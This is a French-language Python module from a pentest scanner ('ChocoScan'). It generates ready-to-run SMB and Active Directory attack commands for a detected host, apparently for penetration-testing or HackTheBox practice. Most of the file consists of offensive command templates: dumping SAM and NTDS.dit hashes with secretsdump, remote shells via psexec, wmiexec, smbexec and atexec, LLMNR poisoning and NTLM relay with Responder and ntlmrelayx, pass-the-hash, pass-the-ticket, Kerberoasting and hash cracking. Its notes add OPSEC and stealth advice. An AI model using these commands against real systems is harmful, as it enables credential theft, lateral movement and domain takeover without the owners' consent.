"""
ChocoScan — SMB Helper.

Génère les commandes d'énumération SMB complètes et les outils impacket
pour chaque contexte détecté (null session, auth, relay, post-compromise).

Complémentaire à ad_enum.py qui se concentre sur Kerberos/LDAP/BloodHound.
Ce module couvre spécifiquement :
  - Null session / anonymous enumeration
  - Shares listing et navigation
  - Users / groups / password policy
  - CrackMapExec (enum + lateral movement)
  - Impacket suite : secretsdump, wmiexec, psexec, smbexec, atexec
  - NTLM Relay attacks (Responder + ntlmrelayx)
  - Pass-the-Hash / Pass-the-Ticket
  - AS-REP Roasting / Kerberoasting (si contexte AD détecté)

Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

from dataclasses import dataclass, field


# ── Modèles ───────────────────────────────────────────────────────────────────

@dataclass
class SMBCommand:
    title:         str
    category:      str       # null_session | enum | impacket | relay | pth | kerberos
    command:       str
    description:   str
    requires_auth: bool = False
    notes:         list[str] = field(default_factory=list)


@dataclass
class SMBContext:
    host:        str
    port:        int  = 445
    domain:      str  = "WORKGROUP"
    hostname:    str  = "TARGET"
    signing:     bool = True   # False → relay possible
    dc:          bool = False  # Est-ce un contrôleur de domaine ?


@dataclass
class SMBResult:
    context:          SMBContext
    null_session:     list[SMBCommand]
    enumeration:      list[SMBCommand]
    impacket:         list[SMBCommand]
    relay:            list[SMBCommand]
    pass_the_hash:    list[SMBCommand]
    kerberos:         list[SMBCommand]
    relay_possible:   bool
    notes:            list[str]


# ── Détection du contexte ─────────────────────────────────────────────────────

def _detect_context(results: list[dict]) -> SMBContext:
    """Extrait le contexte SMB depuis les résultats du scan."""
    host = "TARGET"
    port = 445
    domain = "WORKGROUP"
    hostname = "TARGET"
    signing = True
    dc = False

    for r in results:
        svc = r.get("service", {})
        svc_name = (svc.get("service_name", "") or "").lower()
        p = svc.get("port", 0) or 0
        banner = (svc.get("banner", "") or "").lower()
        product = (svc.get("product", "") or "")

        if p in (445, 139) or "smb" in svc_name or "microsoft-ds" in svc_name:
            host = svc.get("host", host) or host
            port = p

            # Chercher domain/hostname dans le banner
            import re
            domain_match = re.search(r"domain[:\s]+([A-Za-z0-9._-]+)", banner)
            if domain_match:
                domain = domain_match.group(1)

            host_match = re.search(r"(?:hostname|computer)[:\s]+([A-Za-z0-9._-]+)", banner)
            if host_match:
                hostname = host_match.group(1)

            # Détecter signing dans le banner
            if "signing:false" in banner.replace(" ", "").lower() or \
               "message signing disabled" in banner.lower():
                signing = False

            # Détecter si DC (Kerberos sur 88 + LDAP sur 389)
            break

    # Vérifier si DC (Kerberos + LDAP ouverts)
    ports_open = set()
    for r in results:
        ports_open.add(r.get("service", {}).get("port", 0))
    if 88 in ports_open and 389 in ports_open:
        dc = True

    return SMBContext(
        host=host, port=port, domain=domain,
        hostname=hostname, signing=signing, dc=dc,
    )


# ── Null Session ──────────────────────────────────────────────────────────────

def _null_session_cmds(ctx: SMBContext) -> list[SMBCommand]:
    h, d = ctx.host, ctx.domain
    return [
        SMBCommand(
            title="smbclient — Lister les partages (null session)",
            category="null_session",
            command=(
                f"smbclient -L //{h} -N\n"
                f"# Ou avec authentification vide :\n"
                f"smbclient -L //{h} -U ''"
            ),
            description="Lister les partages SMB sans authentification.",
            notes=[
                "-N : null session (sans mot de passe)",
                "Chercher les partages inhabituels : Backup, Temp, Share, SYSVOL...",
            ],
        ),
        SMBCommand(
            title="smbmap — Lister et vérifier les droits (null)",
            category="null_session",
            command=(
                f"smbmap -H {h}\n"
                f"# Lister le contenu d'un partage :\n"
                f"smbmap -H {h} -r SHARENAME\n"
                f"# Download récursif :\n"
                f"smbmap -H {h} --download 'SHARE\\path\\to\\file'"
            ),
            description="Énumération détaillée avec droits R/W par partage.",
            notes=["smbmap indique READ/WRITE/NO ACCESS par partage"],
        ),
        SMBCommand(
            title="enum4linux-ng — Null session complète",
            category="null_session",
            command=(
                f"enum4linux-ng -A {h} -oA enum4linux_output\n"
                f"# Sans output file :\n"
                f"enum4linux-ng -A {h}"
            ),
            description=(
                "Énumération complète : partages, utilisateurs, groupes, "
                "politique de mots de passe, OS."
            ),
            notes=[
                "-A : All (equivalent à -U -G -S -P -O -L -R)",
                "Remplace l'ancien enum4linux.pl",
                "Plus rapide et plus fiable en Python",
            ],
        ),
        SMBCommand(
            title="nmap scripts SMB — Info et vulnérabilités",
            category="null_session",
            command=(
                f"nmap -p 445,139 --script smb-security-mode,"
                f"smb-vuln-ms17-010,smb-enum-shares,smb-enum-users {h}\n"
                f"# Vérification EternalBlue :\n"
                f"nmap -p 445 --script smb-vuln-ms17-010 {h}"
            ),
            description="Scripts nmap pour info SMB + détection EternalBlue (MS17-010).",
            notes=[
                "smb-security-mode → signing activé ?",
                "smb-vuln-ms17-010 → box ancienne ? EternalBlue possible",
            ],
        ),
        SMBCommand(
            title="CrackMapExec — Enum null session",
            category="null_session",
            command=(
                f"crackmapexec smb {h}\n"
                f"crackmapexec smb {h} -u '' -p '' --shares\n"
                f"crackmapexec smb {h} -u 'guest' -p '' --shares"
            ),
            description="Info SMB rapide + test null/guest session avec CrackMapExec.",
            notes=[
                "CMA retourne OS version, hostname, domaine, signing",
                "Guest souvent autorisé sur les boxes HTB",
            ],
        ),
    ]


# ── Enumération authentifiée ──────────────────────────────────────────────────

def _enum_auth_cmds(ctx: SMBContext) -> list[SMBCommand]:
    h, d = ctx.host, ctx.domain
    user_ph = "USER"
    pass_ph = "PASS"
    return [
        SMBCommand(
            title="CrackMapExec — Enum authentifiée complète",
            category="enum",
            command=(
                f"# Shares :\n"
                f"crackmapexec smb {h} -u {user_ph} -p {pass_ph} --shares\n\n"
                f"# Users du domaine :\n"
                f"crackmapexec smb {h} -u {user_ph} -p {pass_ph} --users\n\n"
                f"# Groupes :\n"
                f"crackmapexec smb {h} -u {user_ph} -p {pass_ph} --groups\n\n"
                f"# Politique de mots de passe :\n"
                f"crackmapexec smb {h} -u {user_ph} -p {pass_ph} --pass-pol\n\n"
                f"# Sessions actives :\n"
                f"crackmapexec smb {h} -u {user_ph} -p {pass_ph} --sessions\n\n"
                f"# Loggedin users :\n"
                f"crackmapexec smb {h} -u {user_ph} -p {pass_ph} --loggedon-users"
            ),
            description="Énumération complète avec un compte valide.",
            requires_auth=True,
            notes=[
                "Utiliser --local-auth si compte local (pas domaine)",
                "Adapter -d DOMAIN si authentification de domaine",
            ],
        ),
        SMBCommand(
            title="smbclient — Connexion à un partage",
            category="enum",
            command=(
                f"smbclient //{h}/SHARENAME -U {user_ph}%{pass_ph}\n"
                f"# Commandes utiles dans l'interpréteur :\n"
                f"smb: \\> ls\n"
                f"smb: \\> get filename\n"
                f"smb: \\> put localfile\n"
                f"smb: \\> recurse ON\n"
                f"smb: \\> mget *\n\n"
                f"# Télécharger tout le partage en une commande :\n"
                f"smbget -R smb://{h}/SHARENAME -U {user_ph}%{pass_ph}"
            ),
            description="Connexion interactive à un partage SMB.",
            requires_auth=True,
        ),
        SMBCommand(
            title="Monter le partage localement",
            category="enum",
            command=(
                f"sudo mkdir -p /mnt/smb\n"
                f"sudo mount -t cifs //{h}/SHARENAME /mnt/smb "
                f"-o username={user_ph},password={pass_ph},uid=$(id -u)\n"
                f"ls /mnt/smb/\n\n"
                f"# Sans mot de passe :\n"
                f"sudo mount -t cifs //{h}/SHARENAME /mnt/smb -o username=guest,password="
            ),
            description="Monter le partage SMB comme un répertoire local.",
            requires_auth=True,
            notes=["apt install cifs-utils si mount.cifs manquant"],
        ),
        SMBCommand(
            title="rpcclient — Enum RPC (users, shares, groups)",
            category="enum",
            command=(
                f"rpcclient -U '{user_ph}%{pass_ph}' {h}\n"
                f"# Commandes rpcclient utiles :\n"
                f"rpcclient $> enumdomusers\n"
                f"rpcclient $> enumdomgroups\n"
                f"rpcclient $> queryuserinfo 0x3E8\n"
                f"rpcclient $> querydominfo\n"
                f"rpcclient $> getdompwinfo\n\n"
                f"# En une commande :\n"
                f"rpcclient -U '{user_ph}%{pass_ph}' {h} -c 'enumdomusers'"
            ),
            description="Énumération via RPC/MSRPC — souvent plus verbeux qu'enum4linux.",
            requires_auth=True,
        ),
    ]


# ── Impacket Suite ────────────────────────────────────────────────────────────

def _impacket_cmds(ctx: SMBContext) -> list[SMBCommand]:
    h, d = ctx.host, ctx.domain
    user_ph, pass_ph = "USER", "PASS"
    dom_ph = d if d not in ("WORKGROUP", "TARGET") else "DOMAIN"
    return [
        SMBCommand(
            title="secretsdump — Dump des hashes SAM/NTDS",
            category="impacket",
            command=(
                f"# Dump local (compte admin local) :\n"
                f"impacket-secretsdump {dom_ph}/{user_ph}:{pass_ph}@{h}\n\n"
                f"# Avec hash NTLM (Pass-the-Hash) :\n"
                f"impacket-secretsdump -hashes :NTLM_HASH {dom_ph}/{user_ph}@{h}\n\n"
                f"# Dump NTDS.dit (DC uniquement) :\n"
                f"impacket-secretsdump -just-dc {dom_ph}/{user_ph}:{pass_ph}@{h}\n\n"
                f"# Dump avec clé Kerberos :\n"
                f"impacket-secretsdump -k -no-pass {dom_ph}/{user_ph}@{h}"
            ),
            description=(
                "Dump des hashes SAM (postes) ou NTDS.dit (DC). "
                "Nécessite admin local ou admin domaine."
            ),
            requires_auth=True,
            notes=[
                "Sur un DC : -just-dc pour NTDS.dit directement",
                "Hashes obtenus → Pass-the-Hash ou cracker avec hashcat -m 1000",
            ],
        ),
        SMBCommand(
            title="wmiexec — Exécution via WMI (shell semi-interactif)",
            category="impacket",
            command=(
                f"impacket-wmiexec {dom_ph}/{user_ph}:{pass_ph}@{h}\n\n"
                f"# Avec hash NTLM :\n"
                f"impacket-wmiexec -hashes :NTLM_HASH {dom_ph}/{user_ph}@{h}\n\n"
                f"# Commande unique :\n"
                f"impacket-wmiexec {dom_ph}/{user_ph}:{pass_ph}@{h} 'whoami /all'"
            ),
            description=(
                "Shell semi-interactif via WMI. "
                "Plus discret que psexec (pas de service créé)."
            ),
            requires_auth=True,
            notes=[
                "Pas de SYSTEM — connexion en tant que l'utilisateur fourni",
                "Préférable à psexec pour l'OPSEC",
            ],
        ),
        SMBCommand(
            title="psexec — Shell SYSTEM via service SMB",
            category="impacket",
            command=(
                f"impacket-psexec {dom_ph}/{user_ph}:{pass_ph}@{h}\n\n"
                f"# Avec hash NTLM :\n"
                f"impacket-psexec -hashes :NTLM_HASH {dom_ph}/{user_ph}@{h}\n\n"
                f"# Commande unique :\n"
                f"impacket-psexec {dom_ph}/{user_ph}:{pass_ph}@{h} 'cmd.exe /c whoami'"
            ),
            description=(
                "Shell SYSTEM via création d'un service Windows temporaire. "
                "Bruyant mais donne SYSTEM directement."
            ),
            requires_auth=True,
            notes=[
                "Crée un service temporaire → visible dans les logs EventID 7045",
                "Nécessite admin local et partage ADMIN$ accessible",
                "Utiliser wmiexec si discrétion requise",
            ],
        ),
        SMBCommand(
            title="smbexec — Shell via SMB sans service (discret)",
            category="impacket",
            command=(
                f"impacket-smbexec {dom_ph}/{user_ph}:{pass_ph}@{h}\n\n"
                f"# Avec hash :\n"
                f"impacket-smbexec -hashes :NTLM_HASH {dom_ph}/{user_ph}@{h}"
            ),
            description="Shell via SMB sans créer de service — plus discret que psexec.",
            requires_auth=True,
        ),
        SMBCommand(
            title="atexec — Exécution via le scheduler (discret)",
            category="impacket",
            command=(
                f"impacket-atexec {dom_ph}/{user_ph}:{pass_ph}@{h} 'whoami'\n\n"
                f"# Avec hash :\n"
                f"impacket-atexec -hashes :NTLM_HASH {dom_ph}/{user_ph}@{h} 'ipconfig /all'"
            ),
            description="Exécution via le planificateur de tâches Windows.",
            requires_auth=True,
            notes=["Retourne uniquement le résultat de la commande, pas de shell interactif"],
        ),
        SMBCommand(
            title="CrackMapExec — Exécution de commandes",
            category="impacket",
            command=(
                f"# Exécuter une commande :\n"
                f"crackmapexec smb {h} -u {user_ph} -p {pass_ph} -x 'whoami /all'\n\n"
                f"# PowerShell :\n"
                f"crackmapexec smb {h} -u {user_ph} -p {pass_ph} -X 'Get-LocalUser'\n\n"
                f"# Pass-the-Hash :\n"
                f"crackmapexec smb {h} -u {user_ph} -H NTLM_HASH -x 'whoami'\n\n"
                f"# Spray un subnet :\n"
                f"crackmapexec smb {h}/24 -u {user_ph} -p {pass_ph} --continue-on-success\n\n"
                f"# Vérifier les sessions SAM :\n"
                f"crackmapexec smb {h} -u {user_ph} -p {pass_ph} --sam"
            ),
            description="Couteau suisse SMB — enum + lateral movement.",
            requires_auth=True,
            notes=[
                "Pwn3d! dans la sortie = compte admin local",
                "-M mimikatz pour dump mémoire (nécessite AV bypass)",
                "--spider SHARE pour parser récursivement un partage",
            ],
        ),
    ]


# ── NTLM Relay ────────────────────────────────────────────────────────────────

def _relay_cmds(ctx: SMBContext) -> list[SMBCommand]:
    h = ctx.host
    return [
        SMBCommand(
            title="Responder — Capture NTLM (écoute passive)",
            category="relay",
            command=(
                f"# Identifier l'interface :\n"
                f"ip a  # → ex: tun0, eth0\n\n"
                f"# Lancer Responder (mode capture uniquement) :\n"
                f"sudo responder -I tun0 -wdv\n\n"
                f"# DÉSACTIVER SMB et HTTP si relay (ils doivent être OFF pour relayer) :\n"
                f"# Modifier /etc/responder/Responder.conf :\n"
                f"# SMB = Off\n"
                f"# HTTP = Off\n"
                f"sudo responder -I tun0 -wdv\n\n"
                f"# Les hashes Net-NTLMv2 capturés → hashcat -m 5600 hash.txt rockyou.txt"
            ),
            description=(
                "Capture les hashes NTLM via LLMNR/NBT-NS poisoning. "
                "Fonctionne quand une machine du réseau cherche un nom qui n'existe pas."
            ),
            notes=[
                "Désactiver SMB/HTTP dans Responder.conf avant de lancer ntlmrelayx",
                "LLMNR doit être activé sur le réseau cible (souvent le cas en entreprise)",
                "Hashes Net-NTLMv2 → cracker, pas Pass-the-Hash directement",
            ],
        ),
        SMBCommand(
            title="ntlmrelayx — Relay NTLM vers la cible",
            category="relay",
            command=(
                f"# Condition : SMB Signing = FALSE sur la cible\n"
                f"# Vérifier : nmap -p 445 --script smb-security-mode {h}\n\n"
                f"# Relay vers une cible spécifique :\n"
                f"impacket-ntlmrelayx -tf targets.txt -smb2support\n\n"
                f"# Avec dump SAM automatique :\n"
                f"impacket-ntlmrelayx -tf targets.txt -smb2support -socks\n\n"
                f"# Exécuter une commande lors du relay :\n"
                f"impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'\n\n"
                f"# Targets file :\n"
                f"echo '{h}' > targets.txt\n\n"
                f"# Avec SOCKS proxy (accéder à d'autres services après relay) :\n"
                f"impacket-ntlmrelayx -tf targets.txt -smb2support -socks\n"
                f"# Puis via proxychains : proxychains4 crackmapexec smb {h} -u USER -p ''"
            ),
            description=(
                "Relaye les hashes NTLM capturés par Responder vers une cible "
                "avec SMB signing désactivé → shell ou dump SAM."
            ),
            notes=[
                "SMB Signing doit être désactivé sur la cible pour le relay SMB",
                "-socks : créer un proxy SOCKS après relay (utiliser proxychains4)",
                "Le relay fonctionne aussi vers LDAP/S, MSSQL, HTTP",
                "-l relay_output : sauvegarder les hashes dans un répertoire",
            ],
        ),
        SMBCommand(
            title="Vérification SMB Signing sur le réseau",
            category="relay",
            command=(
                f"# Une cible :\n"
                f"nmap -p 445 --script smb-security-mode {h}\n\n"
                f"# Subnet entier :\n"
                f"crackmapexec smb {h}/24 --gen-relay-list targets.txt\n"
                f"# → targets.txt contient les hôtes avec signing:false\n\n"
                f"# nmap sur plage :\n"
                f"nmap -p 445 --script smb-security-mode {h}/24 | "
                f"grep -B5 'disabled'"
            ),
            description="Identifier les cibles vulnérables au relay (signing désactivé).",
            notes=["CMA --gen-relay-list génère directement le fichier targets.txt"],
        ),
    ]


# ── Pass-the-Hash / Pass-the-Ticket ──────────────────────────────────────────

def _pth_cmds(ctx: SMBContext) -> list[SMBCommand]:
    h, d = ctx.host, ctx.domain
    return [
        SMBCommand(
            title="Pass-the-Hash — CrackMapExec",
            category="pth",
            command=(
                f"crackmapexec smb {h} -u USER -H NTLM_HASH --local-auth\n"
                f"# Ou domaine :\n"
                f"crackmapexec smb {h} -u USER -H NTLM_HASH -d {d}"
            ),
            description="Utiliser un hash NTLM sans connaître le mot de passe en clair.",
            requires_auth=True,
            notes=["Format hash : LM:NTLM ou uniquement :NTLM (les deux colonnes)"],
        ),
        SMBCommand(
            title="Pass-the-Hash — Impacket",
            category="pth",
            command=(
                f"impacket-psexec -hashes :NTLM_HASH {d}/USER@{h}\n"
                f"impacket-wmiexec -hashes :NTLM_HASH {d}/USER@{h}\n"
                f"impacket-secretsdump -hashes :NTLM_HASH {d}/USER@{h}"
            ),
            description="Pass-the-Hash avec la suite impacket.",
            requires_auth=True,
            notes=["Format : LM:NTLM → si LM inconnu, utiliser aad3b435b51404eeaad3b435b51404ee"],
        ),
        SMBCommand(
            title="Pass-the-Hash — Evil-WinRM (WinRM/PS Remoting)",
            category="pth",
            command=(
                f"evil-winrm -i {h} -u USER -H NTLM_HASH\n\n"
                f"# Si WinRM sur port non standard :\n"
                f"evil-winrm -i {h} -P 5985 -u USER -H NTLM_HASH"
            ),
            description="Shell PowerShell via Pass-the-Hash si WinRM est ouvert.",
            requires_auth=True,
            notes=["WinRM : port 5985 (HTTP) ou 5986 (HTTPS)"],
        ),
        SMBCommand(
            title="Overpass-the-Hash → Kerberos ticket",
            category="pth",
            command=(
                f"# Convertir un hash NTLM en ticket Kerberos (nécessite un DC accessible) :\n"
                f"impacket-getTGT {d}/USER -hashes :NTLM_HASH\n"
                f"export KRB5CCNAME=USER.ccache\n"
                f"impacket-psexec -k -no-pass {d}/USER@{h}"
            ),
            description="Convertir un hash en ticket TGT Kerberos — utile si Kerberos préféré à NTLM.",
            requires_auth=True,
        ),
    ]


# ── Kerberos (si contexte AD) ─────────────────────────────────────────────────

def _kerberos_cmds(ctx: SMBContext) -> list[SMBCommand]:
    h, d = ctx.host, ctx.domain
    return [
        SMBCommand(
            title="AS-REP Roasting — Comptes sans préauthentification",
            category="kerberos",
            command=(
                f"# Sans credentials (comptes vulnérables) :\n"
                f"impacket-GetNPUsers {d}/ -dc-ip {h} -request -no-pass -usersfile users.txt\n\n"
                f"# Avec credentials (liste tous les comptes vulnérables) :\n"
                f"impacket-GetNPUsers {d}/USER:PASS -dc-ip {h} -request\n\n"
                f"# Cracker le hash AS-REP :\n"
                f"hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O\n"
                f"john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt"
            ),
            description=(
                "Obtenir des TGTs chiffrables sans authentification "
                "pour les comptes sans Kerberos pre-auth."
            ),
            requires_auth=False,
            notes=[
                "Ne nécessite PAS de credentials si on a une liste d'utilisateurs",
                "Kerbrute peut énumérer les users sans credentials :",
                f"kerbrute userenum -d {d} --dc {h} users.txt",
            ],
        ),
        SMBCommand(
            title="Kerberoasting — Tickets de service",
            category="kerberos",
            command=(
                f"# Lister et demander les tickets de service :\n"
                f"impacket-GetUserSPNs {d}/USER:PASS -dc-ip {h} -request\n\n"
                f"# Sauvegarder les tickets :\n"
                f"impacket-GetUserSPNs {d}/USER:PASS -dc-ip {h} -request "
                f"-outputfile kerberoast.txt\n\n"
                f"# Cracker les tickets :\n"
                f"hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -O\n"
                f"john kerberoast.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt"
            ),
            description=(
                "Demander des tickets TGS pour les comptes de service "
                "et les cracker hors-ligne."
            ),
            requires_auth=True,
            notes=[
                "Nécessite un compte de domaine valide",
                "Les SPNs associés à des comptes utilisateurs (pas machine$) sont les cibles",
            ],
        ),
        SMBCommand(
            title="Pass-the-Ticket — Réutiliser un ticket Kerberos",
            category="kerberos",
            command=(
                f"# Importer un ticket .ccache :\n"
                f"export KRB5CCNAME=/path/to/ticket.ccache\n\n"
                f"# Utiliser avec impacket :\n"
                f"impacket-psexec -k -no-pass {d}/USER@{h}\n"
                f"impacket-wmiexec -k -no-pass {d}/USER@{h}\n\n"
                f"# Convertir .kirbi (Windows) → .ccache (Linux) :\n"
                f"impacket-ticketConverter ticket.kirbi ticket.ccache\n\n"
                f"# Lister les tickets dans le ccache :\n"
                f"klist"
            ),
            description="Réutiliser un ticket Kerberos exporté depuis Windows ou impacket.",
            requires_auth=True,
        ),
    ]


# ── Moteur principal ──────────────────────────────────────────────────────────

def generate_smb_commands(results: list[dict]) -> SMBResult | None:
    """
    Génère les commandes SMB adaptées au contexte détecté.

    Args:
        results: Résultats ChocoScan avec clé "service".

    Returns:
        SMBResult complet, ou None si aucun service SMB détecté.
    """
    # Vérifier qu'un service SMB est présent
    smb_present = any(
        r.get("service", {}).get("port", 0) in (445, 139)
        or "smb" in (r.get("service", {}).get("service_name", "") or "").lower()
        or "microsoft-ds" in (r.get("service", {}).get("service_name", "") or "").lower()
        for r in results
    )

    if not smb_present:
        return None

    ctx = _detect_context(results)

    notes: list[str] = [
        f"Hôte SMB : {ctx.host}:{ctx.port}",
        f"Domaine détecté : {ctx.domain}",
    ]

    relay_possible = not ctx.signing
    if relay_possible:
        notes.append("⚠ SMB Signing DÉSACTIVÉ — Relay NTLM possible !")
        notes.append("→ Lancer Responder + ntlmrelayx simultanément")
    else:
        notes.append("SMB Signing activé — Relay NTLM bloqué (mais hash capture toujours possible)")

    if ctx.dc:
        notes.append("Contrôleur de domaine détecté (port 88 + 389) — AS-REP/Kerberoasting disponibles")

    return SMBResult(
        context=ctx,
        null_session=_null_session_cmds(ctx),
        enumeration=_enum_auth_cmds(ctx),
        impacket=_impacket_cmds(ctx),
        relay=_relay_cmds(ctx),
        pass_the_hash=_pth_cmds(ctx),
        kerberos=_kerberos_cmds(ctx) if ctx.dc else [],
        relay_possible=relay_possible,
        notes=notes,
    )
